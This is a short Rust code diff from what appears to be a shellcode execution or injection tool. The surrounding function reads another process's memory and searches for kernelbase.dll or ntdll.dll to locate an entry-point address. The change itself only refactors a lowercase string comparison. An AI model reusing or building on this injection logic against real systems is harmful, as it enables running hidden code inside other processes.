@@ -79,7 +79,8 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
                 read_virtual_memory(process_info.hProcess, base_dll_name_ptr, &mut name_buf)?;
                 let name = String::from_utf16_lossy(unsafe { std::slice::from_raw_parts(name_buf.as_ptr() as *const u16, base_dll_name_len as usize / 2) });
                 
-                if name.to_lowercase().contains("kernelbase.dll") || name.to_lowercase().contains("ntdll.dll") {
+                let name_lower = name.to_lowercase();
+                if name_lower.contains("kernelbase.dll") || name_lower.contains("ntdll.dll") {
                     // Found target DLL
                     target_entry_point_addr = current_entry + 0x38;
                     found_dll = true;
